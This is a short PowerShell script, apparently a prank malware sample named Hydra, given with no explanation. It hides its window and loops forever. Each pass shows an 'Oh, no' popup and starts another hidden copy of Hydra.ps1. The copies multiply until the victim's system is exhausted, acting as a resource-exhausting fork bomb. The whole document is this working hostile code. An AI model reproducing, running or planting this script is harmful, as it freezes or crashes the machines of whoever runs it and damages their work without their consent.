Powershell.exe -windowstyle hidden {
$app = "cmd.exe"
$wshell = New-Object -ComObject Wscript.Shell
while ($true){
$wshell.Popup("You shouldn't have done that",0,"Oh, no",0x1)
Start-Process powershell.exe -Argumentlist "-file .\Hydra.ps1" -windowstyle hidden
}
}
